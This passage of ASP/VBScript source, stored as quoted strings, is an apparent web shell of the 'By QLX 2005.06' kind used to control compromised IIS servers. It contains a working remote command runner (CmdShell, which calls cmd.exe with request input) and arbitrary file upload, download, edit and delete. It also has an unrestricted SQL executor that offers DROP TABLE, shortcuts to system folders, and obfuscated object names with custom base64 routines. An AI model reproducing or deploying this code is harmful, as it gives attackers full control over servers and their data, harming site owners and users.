            "if (len(SourceText) MOD 3 ) = 2 then",
            "     No2 = asc(mid(SourceText, ndx+1, 1))",
            "     ret = ret & EncodeGroup( ((first * 16) AND 48) + ((No2 * 16) AND 15 ) )",
            "     ret = ret & EncodeGroup( ((No2 * 4) AND 60) )",
            "else",
            "     ret = ret & EncodeGroup( (first * 16) AND 48)",
            "     ret = ret & \"=\"",
            "end if",
            "ret = ret & \"=\"",
            "end if",
            "MyEncode = ret",
            "END FUNCTION",
            "Function RePath(S)",
            "  RePath=Replace(S,\"\\\",\"\\\\\")",
            "End Function",
            "Function RRePath(S)",
            "  RRePath=Replace(S,\"\\\\\",\"\\\")",
            "End Function",
            "If FolderPath<>\"\" then",
            "  Session(\"FolderPath\")=RRePath(FolderPath)",
            "End If",
            "If Session(\"FolderPath\")=\"\" Then",
            "  FolderPath=RootPath",
            "  Session(\"FolderPath\")=FolderPath",
            "End if",
            "Function IsIco(ia,ib,ta)",
            "\tIf ShowFileIco=true Then",
            "      IsIco = \" <img src='\"&IcoPath&ia&\"'> \"",
            "\t  If ib<>\"\" Then",
            "\t  IsIco = \"<img src='\"&IcoPath&ib&\"'> \"",
            "\t  End If",
            "\tElse",
            "\t  IsIco = \"&nbsp;<font face='wingdings' color='#006600' size='3'>\"&ta&\"</font>  \"",
            "\tEnd If",
            "End Function",
            "Function MainForm()",
            "  Sl=\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\">\"",
            "  Sl=Sl&\"<input type=\"\"hidden\"\" name=\"\"Action\"\">\"",
            "  Sl=Sl&\"<input type=\"\"hidden\"\" name=\"\"FName\"\">\"",
            "  Sl=Sl&\"</form>\"",
            "  Sl=Sl&\"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>\"",
            "  Sl=Sl&\"<tr><td height='30' colspan='2'>\"",
            "  Sl=Sl&\"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>\"",
            "  Sl=Sl&\"<form name='addrform' method='post' action='\"&URL&\"' target='_parent'>\"",
            "  Sl=Sl&\"<tr><td width='60' align='center'>Path</td><td>\"",
            "  Sl=Sl&\"<input name='FolderPath' style='width:100%' value='\"&Session(\"FolderPath\")&\"'>\"",
            "  Sl=Sl&\"</td><td width='60' align='center'><input name='Submit' type='submit' value='GoTo'>\" ",
            "  Sl=Sl&\"</td></tr></form></table></td></tr><tr><td width='160'>\"",
            "  Sl=Sl&\"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>\"",
            "  Sl=Sl&\"<td>\"",
            "  Sl=Sl&\"<iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>\"",
            "  Sl=Sl&\"</td></tr></table>\"",
            "  echo Sl",
            "End Function",
            "Function MainMenu()",
            "  Sl=\"<table width='100%' border='0' cellspacing='0' cellpadding='0'>\"",
            "  Sl=Sl&\"<tr><td height='5'></td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"computer.gif\",\"o\")&\"Directory\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  If Not ObT(0,1) Then",
            "    Sl=Sl&\"<tr><td height='20'></td></tr>\"",
            "  Else",
            "  Set ABC=New LBF:Sl=Sl&ABC.ShowDriver():Set ABC=Nothing",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")",
            "  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(WWWRoot)&\"\"\")'>WEB Root</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")",
            "  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(RootPath)&\"\"\")'>Sweet Root</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")",
            "  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"C:\\Program Files\")&\"\"\")'>Program Root</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")",
            "  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"c:\\Documents and Settings\\All Users\")&\"\"\")'>All User Root</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")",
            "  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"C:\\Winnt\\System32\\inetsrv\")&\"\"\")'>Inetsrv Root</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"folder.gif\",\"0\")",
            "  Sl=Sl&\"<a href='javascript:ShowFolder(\"\"\"&RePath(\"C:\\Winnt\\System32\\Logfiles\")&\"\"\")'>Logs Root</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"computer.gif\",chr(43))",
            "  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&replace(\"C:\\Winnt\\system32\\AUTOEXEC.NT\",\"\\\",\"\\\\\")&\"\"\",\"\"EditFile\"\")'>Edit AutoFile</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl& IsIco(\"minus.gif\",\"newfolder.gif\",chr(38))",
            "  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\NewFolder\")&\"\"\",\"\"NewFolder\"\")'>New Folder</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"newfile.gif\",chr(63))",
            "  Sl=Sl&\"<a href='?Action=EditFile' target='FileFrame'>New Text</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  End If",
            "  echo Sl:Sl=\"\"",
            "  Sl=Sl&\"<tr><td>&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"main.gif\",chr(60))",
            "  Sl=Sl&\"<a href='?Action=UpFile' target='FileFrame'>File Up</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;\"",
            "  Sl=Sl&IsIco(\"plus.gif\",\"main.gif\",\"o\")",
            "  Sl=Sl&\"DataBase Operate\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"newfile.gif\",\"4\")",
            "  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\New.mdb\")&\"\"\",\"\"CreateMdb\"\")'>New MDB</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"mdb.gif\",\"4\")",
            "  Sl=Sl&\"<a href='?Action=DbManager' target='FileFrame'>DataBase Opera</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"zip.gif\",\"4\")",
            "  Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\data.mdb\")&\"\"\",\"\"CompactMdb\"\")'>Compress MDB</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"cmd.gif\",\"o\")",
            "  Sl=Sl&\"<a href='?Action=CmdShell' target='FileFrame'>Command</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"main.gif\",chr(91))",
            "  Sl=Sl&\"<a href='?Action=ServerInfo' target='FileFrame'>Sever Info</a>\"",
            "  Sl=Sl&\"</td></tr>\"",
            "  Sl=Sl&\"<tr><td>&nbsp;\"",
            "  Sl=Sl&IsIco(\"minus.gif\",\"htm.gif\",chr(36))",
            "  Sl=Sl&\"<a href='?Action=Search' target='FileFrame'>Search</a>\"",
            "  Sl=Sl&\"</td></tr></table>\"",
            "  echo Sl : Sl=\"\"",
            "End Function",
            "Function ServerInfo()",
            "  Sl=\"<br><table width='500' border='1' cellspacing='0' cellpadding='0' align='center'>\"",
            "  Sl=Sl&\"<tr><td height='30' colspan='3' align='center' bgcolor='menu'>[Server Info]</td></tr>\"",
            "  Sl=Sl&\"<tr align='center'><td height='25' width='200'>Count  Of CPU</td>&nbsp;<td>&nbsp;</td><td>\"&Request.ServerVariables(\"NUMBER_OF_PROCESSORS\")&\"&nbsp;</td></tr>\"",
            "  Sl=Sl&\"<tr align='center'><td height='25' width='200'>Server OS</td><td>&nbsp;</td><td>\"&Request.ServerVariables(\"OS\")&\"&nbsp;</td></tr>\"",
            "  Sl=Sl&\"<tr align='center'><td height='25' width='200'>WEB Ver</td><td>&nbsp;</td><td>\"&Request.ServerVariables(\"SERVER_SOFTWARE\")&\"&nbsp;</td></tr>\"",
            "  For i=0 To 13",
            "    Sl=Sl&\"<tr align='center'><td height='25' width='200'>\"&ObT(i,0)&\"</td><td>\"&ObT(i,1)&\"</td><td>\"&ObT(i,2)&\"</td></tr>\"",
            "  Next",
            "  echo Sl",
            "End Function",
            "Function DownFile(Path)",
            "  Response.Clear",
            "  Set OSM = CreateObject(ObT(6,0))",
            "  OSM.Open",
            "  OSM.Type = 1",
            "  OSM.LoadFromFile Path",
            "    Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Path",
            "    Response.Charset = \"UTF-8\"",
            "    Response.ContentType = \"application/octet-stream\"",
            "    Response.BinaryWrite OSM.Read",
            "    Response.Flush",
            "  OSM.Close",
            "  Set OSM = Nothing",
            "End Function",
            "Function HTMLEncode(S)",
            "  if not isnull(S) then",
            "    S = replace(S, \">\", \"&gt;\")",
            "    S = replace(S, \"<\", \"&lt;\")",
            "    S = replace(S, CHR(39), \"&#39;\")",
            "    S = replace(S, CHR(34), \"&quot;\")",
            "    HTMLEncode = S",
            "  end if",
            "End Function",
            "Function UpFile()",
            "  If Request(\"Action2\")=\"Post\" Then",
            "    Set U=new UPC : Set F=U.UA(\"LocalFile\")",
            "\tUName=U.form(\"ToPath\")",
            "    If UName=\"\" Or F.FileSize=0 then",
            "      Sl=\"<br>The File Path In Server:\"",
            "    Else",
            "        F.SaveAs UName",
            "        If Err.number=0 Then",
            "          Sl=\"<center><br><br><br>File\"&UName&\"Up Succeed</center>\"",
            "\t\tEnd if",
            "\tEnd If",
            "\tSet F=nothing:Set U=nothing",
            "\tSl=Sl&BackUrl",
            "\techo Sl",
            "\tShowErr()",
            "\tResponse.End",
            "  End If",
            "    Sl=\"<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>\"",
            "    Sl=Sl&\"<form name='UpForm' method='post' action='\"&URL&\"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>\"",
            "    Sl=Sl&\"<tr><td>\"",
            "    Sl=Sl&\"Up Path<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\css.asp\")&\"' size='40'>&nbsp;\"",
            "    Sl=Sl&\"<input name='LocalFile' type='file'  size='25'>\"",
            "    Sl=Sl&\"<input type='submit' name='Submit' value='Up'>\"",
            "    Sl=Sl&\"</td></tr></form></table>\"",
            "  echo Sl",
            "End Function",
            "Function SearchCode(InText)",
            "if len(InText) = 0 then",
            "SearchCode = \"\"",
            "exit function",
            "end if",
            "Len_Real = len(InText)",
            "do while mid(InText, Len_Real, 1) = \"=\"",
            "Len_Real = Len_Real - 1",
            "loop",
            "dim ret, ndx, by4, first, No2, third, fourth",
            "ret = \"\"",
            "by4 = (Len_Real \\ 4) * 4",
            "ndx = 1",
            "do while ndx <= by4",
            "first  = SearchGroup(asc(mid(InText, ndx+0, 1)))",
            "No2 = SearchGroup(asc(mid(InText, ndx+1, 1)))",
            "third  = SearchGroup(asc(mid(InText, ndx+2, 1)))",
            "fourth = SearchGroup(asc(mid(InText, ndx+3, 1)))",
            "ret = ret & chr( ((first * 4) AND 255) +   ((No2 \\ 16) AND 3))",
            "ret = ret & chr( ((No2 * 16) AND 255) + ((third \\ 4) AND 15) )",
            "ret = ret & chr( ((third * 64) AND 255) +  (fourth AND 63) )",
            "ndx = ndx + 4",
            "loop",
            "if ndx < Len_Real then",
            "first  = SearchGroup(asc(mid(InText, ndx+0, 1)))",
            "No2 = SearchGroup(asc(mid(InText, ndx+1, 1)))",
            "ret = ret & chr( ((first * 4) AND 255) +   ((No2 \\ 16) AND 3) )",
            "if Len_Real MOD 4 = 3 then",
            "     third = SearchGroup(asc(mid(InText,ndx+2,1)))",
            "     ret = ret & chr( ((No2 * 16) AND 255) + ((third \\ 4) AND 15) )",
            "end if",
            "end if",
            "SearchCode = ret",
            "End Function",
            "Function CmdShell()",
            "  If Request(\"SP\")<>\"\" Then:ShellPath = Request(\"SP\"):Else:ShellPath = \"cmd.exe\":End If",
            "  If Request(\"cmd\")<>\"\" Then DefCmd = Request(\"cmd\")",
            "  Sl=\"<form method='post'><input name='cmd' Style='width:95%' class='cmd' value='\"&DefCmd&\"'><input type='submit' value='Run'>\"",
            "  Sl=Sl&\"<textarea readonly  Style='width:100%;height:500;' class='cmd'>\"",
            "  If Request.Form(\"cmd\")<>\"\" Then Sl=Sl&CreateObject(ObT(1,0)).exec(ShellPath&\" /c \"&DefCmd).stdout.readall",
            "  Sl=Sl&Chr(13)&Chr(13)&Chr(13)&\"Rar e.g.c:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea>\"",
            "  Sl=Sl&\"SHELL Path<input name='SP' value='\"&ShellPath&\"' Style='width:91%'></form>\"",
            "  echo Sl",
            "End Function",
            "Function CreateMdb(Path) ",
            "   Sl=\"<br><br>\"",
            "   Set C = CreateObject(ObT(2,0)) ",
            "   C.Create(\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" & Path)",
            "   Set C = Nothing",
            "   If Err.number=0 Then",
            "     Sl = Sl & Path & \"Great MDB Succeed!\"",
            "   End If",
            "   Sl=Sl&BackUrl ",
            "   echo Sl",
            "End function",
            "Function CompactMdb(Path)",
            "If Not ObT(0,1) Then",
            "    Set C=CreateObject(ObT(3,0)) ",
            "      C.CompactDatabase \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\"&Path&\",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" &Path",
            "\tSet C=Nothing",
            "Else",
            "  Set FSO=CreateObject(ObT(0,1))",
            "  If FSO.FileExists(Path) Then",
            "    Set C=CreateObject(ObT(3,0)) ",
            "      C.CompactDatabase \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\"&Path&\",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" &Path&\"_bak\"",
            "\tSet C=Nothing",
            "    FSO.DeleteFile Path",
            "\tFSO.MoveFile Path&\"_bak\",Path",
            "  Else",
            "    Sl=\"<center><br><br><br>DataBase\"&Path&\"Not Found</center>\" ",
            "\tErr.number=1",
            "  End If",
            "  Set FSO=Nothing",
            "End If",
            "  If Err.number=0 Then",
            "    Sl=\"<center><br><br><br>DataBase\"&Path&\"Compress Succeed</center>\"",
            "  End If",
            "  Sl=Sl&BackUrl",
            "  echo Sl",
            "End Function",
            "Function Search()",
            "strKey = Request.Form(\"Key\")",
            "Sl=\"<table width=100% border=1>\"",
            "Sl=Sl&\"<form method=post action='\" & URL & \"?Action=Search'>\"",
            "Sl=Sl&\"<input type=hidden value=PageSearch name=PageName>\"",
            "Sl=Sl&\"<tr>\"",
            "Sl=Sl&\"<font face='wingdings' color='#006600' size='5'>\"&chr(62)&\"</font> Text File Search (Need FSO Support)</td>\"",
            "Sl=Sl&\"</tr>\"",
            "Sl=Sl&\"<tr>\"",
            "Sl=Sl&\"<td colspan=2 class=trHead>&nbsp;</td>\"",
            "Sl=Sl&\"</tr>\"",
            "Sl=Sl&\"<tr>\"",
            "Sl=Sl&\"<td>&nbsp;Path</td>\"",
            "Sl=Sl&\"<td>&nbsp;<input name=thePath type=text id=thePath value='\"",
            "Sl=Sl&thePath",
            "Sl=Sl&\"' style='width:360px;'>\"",
            "Sl=Sl&\"<input type=button onclick=this.form.thePath.value='\" & Replace(Server.MapPath(\"/\"), \"\\\", \"\\\\\") & \"'; value='RootPath'>\"",
            "Sl=Sl&\"<input type=button onclick=this.form.thePath.value=\"\"\" & Replace(Server.MapPath(\".\"), \"\\\", \"\\\\\") & \"\"\"; value='CurrentPath'>\"",
            "Sl=Sl&\"</td>\"",
            "Sl=Sl&\"</tr>\"",
            "Sl=Sl&\"<tr>\"",
            "Sl=Sl&\"<td width='20%'>&nbsp;KeyWord</td>\"",
            "Sl=Sl&\"<td>&nbsp;<input name=Key type=text value='\" & strKey & \"' id=Key style='width:400px;'> \"",
            "Sl=Sl&\"<select name=theAct id=theAct>\"",
            "Sl=Sl&\"<option value=FileName selected>Filename</option>\"",
            "Sl=Sl&\"<option value=FileContent>Content</option>\"",
            "Sl=Sl&\"<option value=Both>Both</option>\"",
            "Sl=Sl&\"</select>\"",
            "Sl=Sl&\" <input type=submit name=Submit value=Search> </td>\"",
            "Sl=Sl&\"</tr>\"",
            "Sl=Sl&\"<tr>\"",
            "Sl=Sl&\"<td colspan=2 class=trHead>&nbsp;</td>\"",
            "Sl=Sl&\"</tr>\"",
            "Sl=Sl&\"<tr align=right>\"",
            "Sl=Sl&\"<td colspan=2 class=td>By QLX 2005.06&nbsp;</td>\"",
            "Sl=Sl&\"</tr>\"",
            "Sl=Sl&\"</form>\"",
            "Sl=Sl&\"</table>\"",
            "echo Sl:Sl=\"\"",
            "If theAct <> \"\" And strKey <> \"\" Then",
            "\tSearchIt(strKey)",
            "End If",
            "End Function",
            "Sub SearchIt(key)",
            "Dim strPath, theFolder",
            "Response.Buffer = True",
            "strPath = thePath",
            "Set fso=CreateObject(ObT(0,0))",
            "If fso.FolderExists(strPath) = False Then",
            "\techo(thePath & \"Directory Not Exist Or Access Deny!\")",
            "End If",
            "Set theFolder = fso.GetFolder(strPath)",
            "echo \"<br><div style='border:1px solid #d8d8f0;'>\"",
            "Select Case theAct",
            "\tCase \"Both\"",
            "Call SearchFolder(theFolder, key, 1)",
            "\tCase \"FileName\"",
            "Call SearchFolder(theFolder, key, 2)",
            "\tCase \"FileContent\"",
            "Call SearchFolder(theFolder, key, 3)",
            "End Select",
            "echo \"</div>\"",
            "Set theFolder = Nothing",
            "set fso=Nothing",
            "End Sub",
            "Sub SearchFolder(folder, key, flag)",
            "Dim ext, title, theFile, theFolder",
            "For Each theFile In folder.Files",
            "\text = LCase(Split(theFile.Path, \".\")(UBound(Split(theFile.Path, \".\"))))",
            "\tIf flag = 1 Or flag = 2 Then",
            "\tIf InStr(LCase(theFile.Name), LCase(key)) > 0 Then echo FileLink(theFile, \"\")",
            "\tEnd If",
            "\tIf flag = 1 Or flag = 3 Then",
            "If Instr(EditableFileExt, \"$\" & ext & \"$\") > 0 Then",
            "    If SearchFile(theFile, key, title) Then echo FileLink(theFile, title)",
            "End If",
            "\tEnd If",
            "Next",
            "Response.Flush()",
            "For Each theFolder In folder.SubFolders",
            "\tCall SearchFolder(theFolder, key, flag)",
            "Next",
            "end sub",
            "Function SearchFile(f, s, title)",
            "Dim theFile, content, pos1, pos2",
            "On Error Resume Next",
            "Set fso=CreateObject(ObT(0,0))",
            "Set theFile = fso.OpenTextFile(f.Path)",
            "content = theFile.ReadAll()",
            "theFile.Close",
            "Set theFile = Nothing",
            "If Err Then",
            "\tErr.Clear",
            "End If",
            "SearchFile = InStr(1, content, s, 1) ",
            "If SearchFile > 0 Then",
            "\tpos1 = InStr(1, content, \"<TITLE>\", 1)",
            "\tpos2 = InStr(1, content, \"</TITLE>\", 1)",
            "\ttitle = \"\"",
            "\tIf pos1 > 0 And pos2 > 0 Then",
            "title = Mid(content, pos1 + 7, pos2 - pos1 - 7)",
            "\tEnd If",
            "End If",
            "set fso=Nothing",
            "\tEnd Function",
            "Function FileLink(file, title)",
            "fileLink = file.Path",
            "If title = \"\" Then",
            "title = file.Name",
            "End If",
            "Sl=\"<table width='100%'  border='0' cellspacing='1' cellpadding='0'>\"",
            "Sl=Sl&\"<tr onMouseOver=\"\"this.className='tr'\"\" onMouseOut=\"\"this.className=''\"\">\"",
            "Sl=Sl&\"<td height='20'><font face='wingdings' color='#006600' size='3'>2</font> \"",
            "Sl=Sl&\"<a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"DownFile\"\");' title='DownFile'><font color=red>\"& fileLink &\"</font></a></td>\"",
            "Sl=Sl&\"<td width='140'>\"&file.Type&\"</td>\"",
            "Sl=Sl&\"<td width='50'>\"&clng(file.size/1024)&\"K</td>\"",
            "Sl=Sl&\"<td width='120'>\"&file.DateLastModified&\"</td>\"",
            "Sl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"EditFile\"\")' class='am' title='Edit'>edit</a></td>\"",
            "Sl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"DelFile\"\")'  onclick='return yesok()' class='am' title='Delete'>del</a></td>\"",
            "Sl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"CopyFile\"\")' class='am' title='Copy'>copy</a></td>\"",
            "Sl=Sl&\"<td width='40' align=\"\"center\"\"><a href='javascript:FullForm(\"\"\"&replace(fileLink,\"\\\",\"\\\\\")&\"\"\",\"\"MoveFile\"\")' class='am' title='Move'>move</a></td>\"",
            "Sl=Sl&\"</tr></table>\"",
            "fileLink=Sl",
            "End Function",
            "Function DbManager()",
            "  SqlStr=Trim(Request.Form(\"SqlStr\"))",
            "  DbStr=Request.Form(\"DbStr\")",
            "  Sl=Sl&\"<table width='100%'  border='0' cellspacing='0' cellpadding='0'>\"",
            "  Sl=Sl&\"<form name='DbForm' method='post' action=''>\"",
            "  Sl=Sl&\"<tr><td width='100' height='27'> &nbsp;DataBase Connect String:</td>\"",
            "  Sl=Sl&\"<td><input name='DbStr' style='width:100%' value=\"\"\"&DbStr&\"\"\"></td>\"",
            "  Sl=Sl&\"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>E.G</option><option value=0>Access</option>\"",
            "  Sl=Sl&\"<option value=1>MsSql</option><option value=2>MySql</option><option value=3>DSN</option>\"",
            "  Sl=Sl&\"<option value=-1>--SQL--</option><option value=4>Show Data</option><option value=5>Add Data</option>\"",
            "  Sl=Sl&\"<option value=6>Delete Data</option><option value=7>Modify Data</option><option value=8>Great Table</option>\"",
            "  Sl=Sl&\"<option value=9>Delete Table</option><option value=10>Add Field</option><option value=11>Delete Field</option>\"",
            "  Sl=Sl&\"<option value=12>Show All</option></select></td></tr>\"",
            "  Sl=Sl&\"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>\"",
            "  Sl=Sl&\"<tr><td height='30'>&nbsp;SQL Command:</td>\"",
            "  Sl=Sl&\"<td><input name='SqlStr' style='width:100%' value=\"\"\"&SqlStr&\"\"\"></td>\"",
            "  Sl=Sl&\"<td align='center'><input type='submit' name='Submit' value='Execute' onclick='return DbCheck()'></td>\"",
            "  Sl=Sl&\"</tr></form></table><span id='abc'></span>\"",
            "  echo Sl:Sl=\"\"",
            "  If Len(DbStr)>40 Then",
            "  Set Conn=CreateObject(ObT(5,0))",
            "  Conn.Open DbStr",
            "  Set Rs=Conn.OpenSchema(20) ",
            "  Sl=Sl&\"<table><tr height='25' Bgcolor='#CCCCCC'><td>Table<br>Name</td>\"",
            "  Rs.MoveFirst ",
            "  Do While Not Rs.Eof",
            "    If Rs(\"TABLE_TYPE\")=\"TABLE\" then",
            "\t  TName=Rs(\"TABLE_NAME\")",
            "      Sl=Sl&\"<td align=center><a href='javascript:FullSqlStr(\"\"DROP TABLE [\"&TName&\"]\"\",1)'>[ del ]</a><br>\"",
            "      Sl=Sl&\"<a href='javascript:FullSqlStr(\"\"SELECT * FROM [\"&TName&\"]\"\",1)'>\"&TName&\"</a></td>\"",
            "    End If ",
            "    Rs.MoveNext ",
            "  Loop ",
            "  Set Rs=Nothing",
            "  Sl=Sl&\"</tr></table>\"",
            "  echo Sl:Sl=\"\"",
            "If Len(SqlStr)>10 Then",
            "  If LCase(Left(SqlStr,6))=\"select\" then",
            "    Sl=Sl&\"Execute\"&SqlStr",
            "    Set Rs=CreateObject(\"Adodb.Recordset\")",
            "    Rs.open SqlStr,Conn,1,1",
            "    FN=Rs.Fields.Count",
            "    RC=Rs.RecordCount",
            "    Rs.PageSize=500",
            "    Count=Rs.PageSize",
            "    PN=Rs.PageCount",
            "    Page=request(\"Page\")",
            "    If Page<>\"\" Then Page=Clng(Page)",
            "    If Page=\"\" Or Page=0 Then Page=1",
            "    If Page>PN Then Page=PN",
            "    If Page>1 Then Rs.absolutepage=Page",
            "    Sl=Sl&\"<table><tr height=25 bgcolor=#cccccc><td></td>\"\t  ",
            "    For n=0 to FN-1",
            "      Set Fld=Rs.Fields.Item(n)",
            "      Sl=Sl&\"<td align='center'>\"&Fld.Name&\"</td>\"",
            "      Set Fld=nothing",
            "    Next",
            "    Sl=Sl&\"</tr>\"",
            "    Do While Not(Rs.Eof or Rs.Bof) And Count>0",
            "\t  Count=Count-1",
            "\t  Bgcolor=\"#EFEFEF\"",
            "\t  Sl=Sl&\"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>\"  ",
            "\t  For i=0 To FN-1",
            "        If Bgcolor=\"#EFEFEF\" Then:Bgcolor=\"#F5F5F5\":Else:Bgcolor=\"#EFEFEF\":End if",
            "        If RC=1 Then",
            "           ColInfo=HTMLEncode(Rs(i))",
            "        Else",
            "           ColInfo=HTMLEncode(Left(Rs(i),50))",
            "        End If",
            "\t    Sl=Sl&\"<td bgcolor=\"&Bgcolor&\">\"&ColInfo&\"</td>\"",
            "\t  Next",
            "\t  Sl=Sl&\"</tr>\"",
            "      Rs.MoveNext",
            "    Loop",
            "\techo Sl:Sl=\"\"",
            "\tSqlStr=HtmlEnCode(SqlStr)",
            "    Sl=Sl&\"<tr><td colspan=\"&FN+1&\" align=center>Record Count\"&RC&\"&nbsp;Page\"&Page&\"/\"&PN",
            "    If PN>1 Then",
            "      Sl=Sl&\"&nbsp;&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",1)'>Homepage</a>&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&Page-1&\")'>Previous</a>&nbsp;\"",
            "      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if",
            "      For i=Sp To Sp+8",
            "        If i>PN Then Exit For",
            "        If i=Page Then",
            "        Sl=Sl&i&\"&nbsp;\"",
            "        Else",
            "        Sl=Sl&\"<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&i&\")'>\"&i&\"</a>&nbsp;\"",
            "        End If",
            "      Next",
            "\t  Sl=Sl&\"&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&Page+1&\")'>Next</a>&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&PN&\")'>Last</a>\"",
            "    End If",
            "    Sl=Sl&\"<hr color='#EFEFEF'></td></tr></table>\"",
            "    Rs.Close:Set Rs=Nothing",
            "\techo Sl:Sl=\"\"",
            "  Else\t   ",
            "    Conn.Execute(SqlStr)",
            "    Sl=Sl&\"SQL\u48fa\"&SqlStr",
            "  End If",
            "  echo Sl:Sl=\"\"",
            "End If",
            "  Conn.Close",
            "  Set Conn=Nothing",
            "  End If",
            "End Function",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">",
            "<title><%=ApplicationName&\" - \"&ServerIP%></title>",
            "<style type=\"text/css\">",
            "<!--",
            "  body,td {font-size: 12px;}",
            "  input,select{font-size: 12px;background-color:#FFFFFF;}",
            "  .tr {background-color:#EFEFEF;}",
            "  .cmd {background-color:#000000;color:#FFFFFF}",
            "  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;",
            "    <%If Action=\"\" then response.write \"overflow-x:hidden;overflow-y:hidden;\"%>}",
